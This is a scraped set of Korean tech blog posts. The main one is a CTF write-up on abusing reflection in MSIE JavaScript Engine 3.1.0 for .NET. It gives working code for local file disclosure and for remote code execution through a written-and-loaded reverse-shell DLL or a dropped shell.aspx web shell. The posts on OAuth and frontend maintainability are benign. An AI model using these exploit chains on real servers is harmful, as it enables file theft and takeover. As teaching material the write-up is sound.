process.\n\nTo get the Google Client ID and Secret, follow these steps:\n\n\n<div class=\"content-ad\"></div>\n\n- Google Cloud Console로 이동하세요.\n- 새 프로젝트를 만들거나 기존 프로젝트를 선택하세요.\n- API 및 서비스 `자격 증명` 페이지로 이동하세요.\n- `자격 증명 만들기`를 클릭하고 OAuth 클라이언트 ID를 선택하세요.\n- 필수 필드를 작성하여 동의 화면을 구성하세요.\n- 애플리케이션 유형으로 웹 애플리케이션을 선택하세요.\n- http://localhost:3000/auth/google/secrets와 같은 승인된 리디렉션 URI를 추가하세요.\n- 생성을 클릭하여 클라이언트 ID 및 시크릿을 가져오세요.\n\n![OAuthMakesLifeEasy](/assets/img/2024-06-30-OAuthMakesLifeEasy_0.png)\n\n만약 기술에 미숙하다면, 위의 기술 용어에 머리 아프지 마세요. 다음에 \"Google로 가입\"을 보면 안전하니 그냥 사용하세요. 요약하면 이렇습니다. 어쩌다 이런 글을 써야 했네요. HNG 인턴십은 나이지리아와 아프리카의 떠오르는 기술인들에게 흥미로운 기회입니다. HNG 웹사이트를 통해 HNG 인턴십, HNG 채용, 또는 HNG 프리미엄을 확인할 수 있습니다. 안녕히 가세요!","ogImage":{"url":"/assets/img/2024-06-30-OAuthMakesLifeEasy_0.png"},"coverImage":"/assets/img/2024-06-30-OAuthMakesLifeEasy_0.png","tag":["Tech"],"readingTime":4},{"title":"NET에 맞는 JavaScript 엔진 활용 방법","description":"","date":"2024-06-30 18:26","slug":"2024-06-30-ExploitingaJavaScriptEngineforNET","content":"\n\n이 블로그는 .NET 라이브러리용 MSIE JavaScript Engine 버전 3.1.0의 구성 오류를 악용하여 로컬 파일 노출, 임의 파일 쓰기, 원격 코드 실행을 달성하는 내용을 다루고 있습니다. 이는 ICMTC CTF 2024 예선에서 어려운 CTF 도전과제였어요. 함께 시작해봅시다.\n\n도전은 Custom ChatBot 이라 불렸고, 대회에서는 0회 풀렸으며, 저자는 몇 일 동안 도전을 풀고 싶은 사람들을 위해 계속 유지하기로 결정했고, 저는 그에 도전해보았어요. 어떻게 해결했는지 살펴봅시다.\n\n## 도전 설명\n\n![도전 설명](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_0.png)\n\n<div class=\"content-ad\"></div>\n\n도전 과제에는 두 가지 중요한 기능이 있었어요. 하나는 JavaScript로 ChatBot을 사용자 정의하는 것이었고, 다른 하나는 ChatBot과 상호 작용하는 것이었죠.\n\n![이미지1](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_1.png)\n\n![이미지2](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_2.png)\n\n간단한 기능이 실행되고 우리에게 응답이 전송되었음을 확인할 수 있어요. 도전 과제 설명으로부터, JavaScript 코드의 구문 분석을 처리하는 라이브러리와 라이브러리 버전을 알 수 있었구요. 그래서 제가 한 일은 이미 알려진 취약점이나 CVE를 찾아보는 것이었지만 발견하지 못했어요. 그래서 우리가 주변을 살펴보고 환경을 이해하기 시작할 때가 되었어요.\n\n<div class=\"content-ad\"></div>\n\n## 어플리케이션 이해하기\n\n첫 번째로 해야 할 일은 어떤 문맥에서 실행 중이며 어떤 객체들을 사용할 수 있는지 알아내는 것입니다. 그럴려면 어떻게 해야 할까요? 먼저 떠오르는 것은 this 객체인데, 그 중요성에 대해 간단히 설명해 드리겠습니다.\n\nJavaScript나 다른 몇몇 프로그래밍 언어에서 this 키워드는 해당 객체를 가리킵니다. 그 값은 사용된 문맥에 따라 달라집니다. 문맥에 대해 더 잘 설명하기 위해, 브라우저 콘솔에서 JavaScript를 실행하는 간단한 예제를 보여 드리겠습니다. 브라우저 콘솔에서 console.log(this)를 실행하면 window 객체를 얻을 수 있고, 그 문맥 안에서 실행 중이므로 window 객체의 속성에 액세스할 수 있습니다.\n\n![이미지](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_3.png)\n\n<div class=\"content-ad\"></div>\n\n보시다시피 window 객체에서 이용 가능한 많은 멤버들이 있으며 그 중 하나인 document 객체에 접근했습니다. 또한 window 컨텍스트에 정의된 함수에도 접근할 수 있습니다. 예를 들어 atob와 같은 함수가 있습니다.\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_4.png\" />\n\n이제 애플리케이션 컨텍스트에서 this 객체를 탐색하고 해당 멤버들을 모두 나열해야 합니다. 아래의 자바스크립트 코드를 사용하여 모든 멤버를 나열할 수 있습니다:\n\n```js\nfunction processMessage(message) {\n    try {\n        var objs = [];\n        for (var obj in this) {\n            objs.push(obj);\n        }\n        return \"Objects: \" + objs.join(\", \");\n    } catch (e) {\n        return \"Error: \" + e.message;\n    }\n}\nvar response = processMessage(message);\nresponse;\n```\n\n<div class=\"content-ad\"></div>\n\n\n![Screenshot 1](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_5.png)\n\n우리가 얻은 결과에는 JavaScript 코드에서 정의하지 않은 ProcessChat_Helper 객체가 포함되어 있었습니다. 그래서 접근해 보려고 했고, 다음과 같은 응답을 받았습니다:\n\n```js\nthis.ProcessChat_Helper \n```\n\n![Screenshot 2](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_6.png)\n\n\n<div class=\"content-ad\"></div>\n\n결과에 따르면 이 객체는 jail.Controllers.ProcessChatHelper 클래스의 .Net 객체입니다. 그것이 .Net 객체인지 어떻게 알게 되었을까요? JavaScript 객체를 정의하고 동일한 방식으로 액세스하려고 시도하면 완전히 다른 결과를 얻을 수 있습니다.\n\n```js\nvar jsObject = {};\nthis.jsObject\n```\n\n![image](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_7.png)\n\n그렇다면 왜 그리고 어떻게 JavaScript 컨텍스트에서 .Net 객체에 액세스할 수 있을까요? 도전 과제의 로컬 복사본을 만들어보는 중에 답을 찾았습니다. 여기에 .Net 객체를 노출하는 코드가 있습니다:\n\n<div class=\"content-ad\"></div>\n\n```js\n// 코드 조각. \nusing (var engine = new MsieJsEngine())\n{\n  // C# 객체를 JavaScript 컨텍스트에 노출\n  engine.EmbedHostObject(\"ProcessChat_Helper\", ProcessChatHelperObject);\n  // 스크립트를 평가\n  var result = engine.Evaluate<string>(script);\n}\n```\n\n## C#에서의 Reflection\n\nProcessChat_Helper 객체는 ProcessChatHelper 클래스의 인스턴스이며, 해당 클래스가 어떻게 구현되었는지를 알 수 없기 때문에 객체 내의 공개 메서드를 열거해야 합니다. 하지만 어떻게 그것을 할 수 있을까요? 조금의 검색 끝에 GitHub의 라이브러리 저장소로 이동하여 3.1.0 이후의 릴리스에서 뭔가 이상한 것을 발견했습니다.\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_8.png\" />\n\n\n<div class=\"content-ad\"></div>\n\n릴리스에 따르면 AllowReflection의 기본값이 이제 기본적으로 false로 설정되어 있습니다. 이것은 v3.1.0에서 그렇지 않았던 것입니다. 그렇다면 Reflection이란 무엇일까요? 제 친구인 ChatGPT에게 물어봤는데, 그는 전체 과정 동안 큰 도움이 되었습니다. 그가 말한 내용은 다음과 같습니다:\n\n![이미지](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_9.png)\n\n간단히 말하자면, 이 설정이 true로 설정된 경우, .Net 객체에 액세스할 수 있다면 해당 클래스의 속성에 액세스하고 런타임 중에 공개 메서드를 실행할 수 있습니다. 그렇다면 ProcessChat_Helper 객체에 어떤 메서드가 있는지 살펴보겠습니다. 다음 코드로 확인할 수 있습니다:\n\n```js\nfunction processMessage(message) {\n    try {\n        var methods = [];\n        var processChatHelper = this[\"ProcessChat_Helper\"];\n        if (processChatHelper !== undefined) {\n            methods.push(\"Methods: \" + Object.getOwnPropertyNames(processChatHelper).join(\", \"));\n        }\n        return \"\" + methods.join(\", \");\n    } catch (e) {\n        return \"Error: \" + e.message;\n    }\n}\nvar response = processMessage(message);\nresponse;\n```\n\n<div class=\"content-ad\"></div>\n\n\n![Screenshot](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_10.png)\n\n해당 객체에는 7가지 메서드가 있고, 이를 호출할 수 있습니다. 예를 들어, GetHashCode() 메서드를 호출하려면 this.ProcessChat_helper.GetHashCode()를 사용하여 클래스 이름을 문자열로 가져올 수 있습니다.\n\n```js\nthis.ProcessChat_Helper.GetHashCode()\n```\n\n![Screenshot](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_11.png)\n\n\n<div class=\"content-ad\"></div>\n\n## 타입 및 메서드\n\nGetAvailableLanguages() 메서드를 호출하려고 시도했더니 다음과 같은 결과가 나왔어요:\n\n```js\nthis.ProcessChat_Helper.GetAvailableLanguages()\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_12.png\" />\n\n<div class=\"content-ad\"></div>\n\n우리가 돌아온 반환 유형은 실제 데이터가 아니라 문자열 배열이며, Reflection이 활성화되어 있기 때문에 해당 유형의 메서드를 호출할 수 있습니다. 예를 들어, 함수에서 반환된 배열의 길이를 얻고 싶다면 GetLength(0) 메서드를 호출하여 각 색인의 값 가져오려면 GetValue(index)를 사용합니다:\n\n```js\n// 여기서 Zero는 배열의 차원을 나타내며, 우리 경우 1차원 배열\nvar len = this.ProcessChat_Helper.GetAvailableLanguages().GetLength(0); // 2\nvar elements = [];\nfor(let i = 0; i < len; i++) {\n  elements.push(this.ProcessChat_Helper.GetAvailableLanguages().GetValue(i));\n}\nelements.join(', ')\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_13.png\" />\n\n지금까지는 ProcessChatHelper 클래스의 메서드를 호출할 수 있었지만, 더 다룰 클래스인 System.String[]이 있고, 이 코드를 사용하여 해당 클래스의 함수를 나열할 수 있습니다. GetMethods() 함수는 클래스의 모든 메서드 배열을 반환하므로 이를 활용할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nvar methodsArray = this.ProcessChat_Helper.GetAvailableLanguages().GetType().GetMethods(); \nvar len = methodsArray.GetLength(0);\nvar methods = [];\nfor( let i = 0; i < len; i++) {\n   var typeName = methodsArray.GetValue(i).ToString();\n   methods.push(typeName);\n};\nmethods.join(', ')\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_14.png\" />\n\n이제 우리는 현재 형식이 직접 상속받는 형식, 즉 부모 클래스의 형식을 가져오는 유형의 속성인 BaseClass를 가져올 수도 있습니다. 이 작업을 System.String[] 유형으로 수행하면 System.Object를 얻게 되는데, 이는 다음 섹션에서 매우 유용하게 사용될 것입니다.\n\n```js\nthis.ProcessChat_Helper.GetType().BaseType\n```\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_15.png\" />\n\n## 어셈블리\n\n지금까지 우리는 System.Object, System.String[]을 가지고 있으며 그 중 어느 것도 플래그 파일을 읽을 수 있는 메소드가 없습니다. 이제 어셈블리 속성이 등장합니다. C# 문서에 따르면 타입의 어셈블리 속성은 어셈블리 인스턴스를 반환하며, 이것은 현재 컨텍스트에서 System.Object 클래스를 사용하는 모든 클래스를 포함하는 큰 개체로 생각할 수 있습니다.\n\n다시 말해, 우리가 System.Object 타입을 가지고 있고 이것의 어셈블리 속성에 액세스했다면, 현재 컨텍스트에서 System.Object 클래스를 사용하는 모든 클래스를 포함하는 큰 어셈블리가 있습니다. 이는 우리에게 유용합니다. 왜냐하면 로컬 파일을 읽을 수 있는 다른 타입에 액세스하고 싶기 때문에, 우리는 System.IO.File 타입의 ReadAllText 메소드에 액세스함으로써 이를 수행할 수 있습니다. 다음 코드는 어셈블리 내의 모든 타입을 출력합니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar len = typesArray.GetLength(0); // Array length = 2594 :\"D \nvar types= [];\nfor( let i = 0; i < len; i++) {\n   types.push(typesArray.GetValue(i).ToString());\n};\ntypes.join(\", \")\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_16.png\" />\n\n어셈블리에 있는 모든 타입들입니다. 2594개의 타입이 있습니다.\n\n## 로컬 파일 노출\n\n\n<div class=\"content-ad\"></div>\n\n이제 우리는 System.IO.File 유형이 필요하다는 것을 알았으므로, 해당 유형의 배열에서 인덱스를 가져와 직접 액세스할 수 있어야 합니다.\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar len = typesArray.GetLength(0);\nvar types= [];\nfor( let i = 0; i < len; i++) {\n   var typeName = typesArray.GetValue(i).ToString();\n   if(typeName == \"System.IO.File\"){\n      var index = i;\n      break;\n   }\n};\ntypesArray.GetValue(index).ToString() + \"Type found at index: \" + index\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_17.png\" />\n\n이제 동일한 방식으로 System.IO.File 유형에서 ReadAllText 메서드를 가져오겠습니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar fileTypeMethods = typesArray.GetValue(2008).GetMethods();\nvar len = fileTypeMethods.GetLength(0);\nvar methods = {};\nfor( let i = 0; i < len; i++) {\n   var methodName = fileTypeMethods.GetValue(i).ToString();\n   if(methodName.includes(\"ReadAllText\")){\n      var index = i;\n      methods[i] = methodName;\n   }\n};\nJSON.stringify(methods)\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_18.png\" />\n\n필요한 함수는 인덱스 49에 있으므로, 해당 경로로 호출해 보겠습니다. 메서드에 Invoke를 사용할 것입니다. 문서에서 원하는 Invoke 메서드는 2개의 매개변수를 취하며, 둘 다 객체여야 합니다. 첫 번째 매개변수는 해당 메서드를 호출하려는 클래스의 인스턴스여야 하며, 두 번째 매개변수는 메서드에 전달할 인수를 포함하는 배열이어야 합니다. ReadAllText는 정적 메서드이므로 첫 번째 인수는 null이어야 합니다.\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar fileTypeMethods = typesArray.GetValue(2008).GetMethods();\narg = [\"c:\\\\windows\\\\win.ini\"];\nfileTypeMethods.GetValue(49).Invoke(null, arg)\n```\n\n<div class=\"content-ad\"></div>\n\n\n![2024-06-30-ExploitingaJavaScriptEngineforNET_19](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_19.png)\n\n에러가 발생했습니다! 이 에러의 원인은 Invoke 함수가 JavaScript 객체가 아닌 .Net 객체를 매개변수로 취한다는 것입니다. 따라서 함수에 경로가 될 .Net 객체나 .Net 문자열 배열이 필요합니다.\n\n그래서 열거로 돌아가서, 인스턴스를 가지고 있지 않기 때문에 null이어야 하는 정적 함수를 호출해야 하며, 매개변수를 가져서 하나의 요소로 이루어진 문자열 배열을 반환해야 합니다.\n\n몇 가지 열거를 통해 System.Environment 클래스의 GetCommandLineArgs 함수가 이 작업을 수행한다는 것을 찾아냈습니다. 그러니 호출하여 문자열 배열을 가져오겠습니다.\n\n\n<div class=\"content-ad\"></div>\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar len = typesArray.GetLength(0); \nvar types= [];\nfor( let i = 0; i < len; i++) {\n   var typeName = typesArray.GetValue(i).ToString();\n   if(typeName == \"System.Environment\"){\n      var typeIndex = i;\n      break;\n   }\n};\nvar envType = typesArray.GetValue(typeIndex); // typeIndex = 128 \nvar oneElemArr = envType.GetMethod(\"GetCommandLineArgs\").Invoke(null,null).GetValue(0); \noneElemArr\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_20.png\" />\n\n이 배열을 사용하여 SetValue(Value, index)로 요소를 원하는 파일 경로로 설정하고 invoke 함수에 전달하면 Local File Disclosure을 얻을 수 있습니다.\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar fileReadMethods = typesArray.GetValue(2008).GetMethods();\nvar envType = typesArray.GetValue(128);\nvar oneElemArr = envType.GetMethod(\"GetCommandLineArgs\").Invoke(null,null); \noneElemArr.SetValue(\"C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\", 0);\nfileReadMethods.GetValue(49).Invoke(null, oneElemArr)\n```\n\n<div class=\"content-ad\"></div>\n\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_21.png\" />\n\n## 플래그 읽기\n\n이제 도전 과제의 마지막 조각인데요, c:\\temp 디렉터리에 있는 플래그 파일을 읽어야 합니다. 하지만 우리는 플래그의 이름을 모르기 때문에 flag.txt가 아니라고 확신하고 있어요. 제가 시도해 봤기 때문이죠. 따라서 temp 디렉터리에있는 파일을 나열한 다음에 readfile 메서드를 사용하여 읽어야 합니다.\n\n디렉터리에 있는 파일을 나열하기 위해서, System.IO.Directory 유형의 GetFiles(String path) 메서드가 이를 처리할거에요. 그러니 이를 사용해 봅시다.\n\n\n<div class=\"content-ad\"></div>\n\n```js\r\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\r\nvar typesArray = objectClass.Assembly.GetTypes();\r\nvar len = typesArray.GetLength(0); \r\nvar types = [];\r\nfor( let i = 0; i < len; i++) {\r\n   var typeName = typesArray.GetValue(i).ToString();\r\n   if(typeName == \"System.IO.Directory\"){\r\n      var typeIndex = i;\r\n      break;\r\n   }\r\n};\r\nvar dirTypeMethods = typesArray.GetValue(typeIndex).GetMethods();\r\nvar len = dirTypeMethods.GetLength(0);\r\nvar methods = {};\r\nfor( let i = 0; i < len; i++) {\r\n   var methodName = dirTypeMethods.GetValue(i).ToString();\r\n   if(methodName.includes(\"GetFiles\")){\r\n      var index = i;\r\n      methods[i] = methodName;\r\n   }\r\n};\r\nvar getFilesMethod = dirTypeMethods.GetValue(17); // GetFile(String) at index 17\r\nvar envType = typesArray.GetValue(128);\r\nvar oneElemArr = envType.GetMethod(\"GetCommandLineArgs\").Invoke(null,null); \r\noneElemArr.SetValue(\"C:\\\\Temp\", 0);\r\n// Getting all the filenames in the c:\\\\temp\r\ntempFilesArr = getFilesMethod.Invoke(null, oneElemArr);\r\nvar len = tempFilesArr.GetLength(0);\r\nvar fileReadMethod = typesArray.GetValue(2008).GetMethods().GetValue(49);\r\nfor( let i = 0; i < len; i++) {\r\n   var fileName = tempFilesArr.GetValue(i);\r\n   oneElemArr.SetValue(fileName, 0);\r\n   // the Flag filename contais Flag and some other random values\r\n   if(fileName.includes(\"Flag\")) {\r\n     // read the flag file\r\n     var fileContent = fileReadMethod.Invoke(null, oneElemArr);\r\n     break;\r\n   }\r\n};\r\nfileContent\r\n```\r\n\r\n![Screenshot](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_22.png)\r\n\r\n## 원격 코드 실행\r\n\r\nRCE에 대해서는 원격에서 작동하지 않아 작동 원인을 알 수 없었지만 로컬에서는 작동했으므로 다른 누군가에게 도움이 될지도 모르니 코드를 공유하겠습니다.\r\n\n\n<div class=\"content-ad\"></div>\n\nRCE의 아이디어는 System.IO.File 클래스의 WriteAllText(String content, String path)를 사용하여 서버에 악성 .dll 파일을 작성하고, System.Reflection.Assembly 클래스의 LoadFile(String path) 함수를 사용하여 해당 파일을 로드하는 것입니다. 여기서 역쉘 dll 파일의 코드를 찾을 수 있습니다. 이를 컴파일한 후 hex로 인코딩하고 바이트를 \\x69 형식으로 작성하여 코드 내에서 해당 부분을 대체하십시오.\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar fileTypeMethods = typesArray.GetValue(2008).GetMethods();\nvar writeFileMethod = fileTypeMethods.GetValue(51);\nvar writeFileArgs = this.ProcessChat_Helper.GetAvailableLanguages();\nwriteFileArgs.SetValue(\"c:\\\\temp\\\\z4ki.dll\", 0);\nwriteFileArgs.SetValue(\"\\x7a\\x34\\x6b\\x69\", 1); // <--  여기를 편집하세요\nwriteFileMethod.Invoke(null, writeFileArgs);\nvar assemblyType = objectClass.Assembly.GetType().BaseType\nvar oneElemArr = objectClass.Assembly.GetTypes().GetValue(128).GetMethod(\"GetCommandLineArgs\").Invoke(null,null);\noneElemArr.SetValue(\"C:\\\\Temp\\\\z4ki.dll\",0);\nassemblyType.GetMethod(\"LoadFile\").Invoke(null,oneElemArr);\n```\n\n## 또 다른 RCE 방법\n\n다른 방법으로는, 서버의 웹 루트에 shell.aspx 파일을 작성하여 라이브러리에서 원격 코드 실행을 얻을 수 있습니다. 그러나 불행하게도 웹 루트에 쓰기 권한이 없었지만 참고를 위해 코드를 여기에 남깁니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar fileTypeMethods = typesArray.GetValue(2008).GetMethods();\nvar writeFileMethod = fileTypeMethods.GetValue(51);\nvar writeFileArgs = this.ProcessChat_Helper.GetAvailableLanguages();\nwriteFileArgs.SetValue(\"c:\\\\ChatBot\\\\wwwroot\\\\shell.aspx\", 0);\nwriteFileArgs.SetValue(\"\\x7a\\x34\\x6b\\x69\", 1); // <--  여기를 수정하세요\nwriteFileMethod.Invoke(null, writeFileArgs);\n```\n\n이제 http://`ip`/shell.aspx 로 이동하면 쉘을 찾을 수 있습니다.\n\n여기까지 오신 당신에게 경의를 표하며 읽기를 즐겼고 새로운 것을 배웠기를 바랍니다. 궁금한 점이 있으면 LinkedIn에서 연락해 주세요.\n","ogImage":{"url":"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_0.png"},"coverImage":"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_0.png","tag":["Tech"],"readingTime":15},{"title":"2년 후에도 고통스럽지 않은 프론트엔드 프로젝트 시작하는 방법","description":"","date":"2024-06-27 18:26","slug":"2024-06-27-StartingaFrontendprojectthatwontturnintoanightmarein2years","content":"\n\n새 프로젝트를 시작하면 항상 세상에서 가장 기분 좋은 순간 중 하나입니다. 새로운 시작에는 신선함과 훌륭한 아이디어가 넘쳐납니다. 이번에는 회사에 여러 해 동안 도움이 되는 깨끗하고 유지보수가 용이하며 확장 가능한 프로젝트가 될 것이라고 자신과 팀원들에게 이야기합니다.\n\n하지만 일이 벌어지면! 기능을 계속해서 추가하다 보면 처음에는 그렇게 나쁘지 않다고 생각할 수 있습니다. 그러나 시간이 흐른 뒤에 이 프로젝트가 과거 프로젝트에서 싫어하던 모든 것으로 변해버렸다는 것을 깨닫게 됩니다!\n\n이런 일이 발생하지 않도록 프로젝트의 위험을 최소화하는 방법이 있습니다. 제가 몇 가지 예시를 vue를 사용해서 만들어보았습니다(내 경험이 더 풍부하기 때문에), 하지만 모든 종류의 프론트엔드 프로젝트에 적용됩니다:\n\n# 더 적은 라이브러리는 프로젝트의 장수와 단순함을 의미합니다\n\n<div class=\"content-ad\"></div>\n\n프로젝트의 스택과 라이브러리를 선택할 때 조심해야 해요. 각 라이브러리는 일정 시간을 절약할 수 있는 기능을 가지고 있을 수 있지만 프로젝트에 복잡성을 추가할 수도 있어요. 게다가 그 라이브러리에 의존하게 되면 유지보수되지 않는다면 문제가 생길 수 있어요.\n\n특히 프로젝트 구문 전반에 영향을 주는 라이브러리와 도구들인 Tailwind CSS, SCSS, CSS-in-JS 라이브러리, 그리고 TypeScript은 특히 중요해요.\n\n이러한 라이브러리 각각이 훌륭할 수 있지만, 팀에 따라 선택해야 하며 우리가 언급한 단점을 상쇄할 가치가 있는지 확인해야 해요. 특히 이제 HTML/CSS에 CSS 변수, calc 및 다른 새로운 HTML 기능과 기술이 추가되면서 더 많은 일을 할 수 있어요.\n\n두 가지 프로젝트를 상상해봐요:\n\n<div class=\"content-ad\"></div>\n\n- 프로젝트 원: Vue.js만 사용하여 일반 CSS와 HTML 템플릿을 사용합니다.\n- 프로젝트 투: Vue.js, SCSS, Tailwind CSS, 그리고 PrimeVue를 사용합니다.\n\n# 1년 후 유지보수 시나리오\n\n물론 사람들은 각양각색이고 어떤 사람들은 이러한 기술을 좋아할 수도 있고 내가 쓴 것과 다를 수 있지만, 내가 상상한 것은 다음과 같습니다:\n\n## 프로젝트 원:\n\n<div class=\"content-ad\"></div>\n\n새로운 팀원 온보딩:\n\n- 간단한 프로세스입니다.\n- HTML, CSS 및 기본 Vue.js 구문을 알고 있으면 충분합니다.\n- 주로 프로젝트 코드베이스 및 비즈니스 로직에 중점을 두고 있습니다.\n\n유지보수 및 업데이트:\n\n- 컴포넌트를 만드는 데 더 많은 시간이 필요할 수 있습니다.\n- 개발자들은 잘 알려진 컴포넌트 라이브러리를 참고하여 영감을 얻고 빠르게 컴포넌트를 만들 수 있습니다.\n- 1년 후에는 대부분의 기본 컴포넌트가 이미 구축되어 있습니다.\n- Vue.js를 업데이트할 때 의존성에 대해 크게 걱정할 필요가 없습니다.\n\n<div class=\"content-ad\"></div>\n\n## 두 번째 프로젝트:\n\n신규 팀원 온보딩:\n\n- 모든 템플릿에서 Tailwind CSS 구문을 사용하므로 신규 멤버는 이를 배워야 합니다.\n- PrimeVue 및 SCSS에 대한 지식 또한 필요합니다.\n- Tailwind CSS, PrimeVue 및 SCSS에 대한 문서를 검토하고 이해해야 합니다.\n\n유지 보수 및 업데이트:\n\n<div class=\"content-ad\"></div>\n\n- 새로운 Vue 버전(e.g., Vue 4)로 업데이트하려면 PrimeVue 컴포넌트와의 호환성을 확인해야 합니다.\n- 라이브러리(Tailwind CSS, PrimeVue, SCSS) 중 하나라도 사용 중지되면, 코드를 상당히 리팩토링하거나 다시 작성해야 할 수도 있습니다.\n\n프로젝트의 수명을 연장하는 데 중요한 것은 최소한의 종속성(특히 전체 프로젝트를 변경할 수 있는 종속성)을 가지고 있는 것을 알 수 있습니다.\n\n# 종속성 감싸기\n\n프론트엔드 개발자로서 모든 것을 처음부터 쓰는 것은 불가능합니다. 그러나 한 라이브러리와 영원히 결혼하길 원하지도 않습니다. 라이브러리의 API가 프로젝트와 일치하지 않을 수도 있습니다.\n\n<div class=\"content-ad\"></div>\n\n판단력이 중요하죠! 제가 도와드릴 수 있는 게 있으면 언제든 말해주세요!\n\n<div class=\"content-ad\"></div>\n\n# 프레임워크 가이드라인을 준수하고 만들어진 표준을 사용하세요\n\n사용 중인 프레임워크에는 가이드라인, 네이밍 규약 및 권장 구조가 있다면 정말 좋은 일입니다!\n\n왜냐하면 여러분은 바퀴를 다시 발명할 필요가 없을 뿐더러(아마도 최악의 바퀴), 모든 규칙을 문서화할 필요가 없고 프레임워크 문서에 링크만 걸어놓으면 됩니다.\n\n![2024-06-27-StartingaFrontendprojectthatwontturnintoanightmarein2years_0.png](/assets/img/2024-06-27-StartingaFrontendprojectthatwontturnintoanightmarein2years_0.png)\n\n<div class=\"content-ad\"></div>\n\n팀 내에서 자전거 건물 토론을 피하고 중요한 부분에 집중할 수 있어요.\n\nVue.js 스타일 가이드는 큰 프로젝트를 깔끔하게 유지하는 데 도움이 되는 많은 좋은 컨벤션들을 이미 갖고 있어 좋은 예시에요. 또한, Vue가 권장하는 폴더 구조와 함께 보일러플레이트를 생성하는 방식도 맘에 들어요.\n\n# SOLID 원칙 사용하기\n\n프런트엔드를 하다보면 다른 소프트웨어 엔지니어링 문화와는 별개로 따로 있는 것처럼 생각할 때가 있지만, 사실은 기계가 실행할 코드를 작성하고 있기 때문에 수년간의 소프트웨어 엔지니어링 경험을 활용하는 것이 프런트엔드에 유익하답니다.\n\n<div class=\"content-ad\"></div>\n\n여러 프론트엔드 프로젝트에서 SOLID를 사용하는 데 도움이 되는 좋은 기사들이 많이 있어요. 예를 들어,\n\n- React에 SOLID 적용하기\n- 미치지 않고 Vue.js 컴포넌트 라이브러리 만들기\n\n그리고 검색을 통해 더 많은 정보를 얻을 수 있어요.\n\n# 가이드라인 페이지가 있어요\n\n<div class=\"content-ad\"></div>\n\n프로젝트 기술 스택을 설명하는 다양한 하위 페이지가 포함된 가이드 라인 페이지가 있도록 해주세요. Vue 스타일 가이드와 같은 모든 관련 온라인 문서 및 가이드라인에 대한 링크가 포함되어야 합니다. 이 포괄적인 리소스는 기술 프레임워크와 모범 사례의 중심 허브로 작용할 것입니다.\n\n또한, 가이드라인은 철학을 상세히 설명하고 프로젝트가 확장 가능하고 유지 보수가 용이하도록하는 데 필요한 모든 정보를 제공해야 합니다. 이는 개발 프로세스 전반에 걸쳐 일관성과 품질을 유지하는 데 도움이 될 것입니다.\n\n기억하세요. 초기 선택 사항은 초기 개발뿐만 아니라 향후 확장성과 유지 보수의 용이성에도 영향을 줍니다.\n\n귀하의 프론트엔드 프로젝트를 유지 가능하고 확장 가능하게 유지하는 데 효과적인 전략은 무엇인가요? 아래 댓글에서 귀하의 생각과 경험을 들어보고 싶습니다.","ogImage":{"url":"/assets/img/2024-06-27-StartingaFrontendprojectthatwontturnintoanightmarein2years_0.png"},"coverImage":"/assets/img/2024-06-27-StartingaFrontendprojectthatwontturnintoanightmarein2years_0.png","tag":["Tech"],"readingTime":4},{"title":"움직이는 메쉬 그라데이션 배경으로 웹사이트에 생명을 불어넣는 방법","description":"","date":"2024-06-27 18:24","slug":"2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds","content":"\n\n요즘에는 메쉬 그라데이션 디자인이 점점 더 인기를 끌고 있는 것 같아요.\n\n이것이 저에게 궁금증을 일으켰는데, 만약 이 그라데이션을 애니메이션화해서 더 생동감 있게 만들 수 있을까요?\n\n![이미지](/assets/img/2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds_0.png)\n\n본문에서는 움직이는 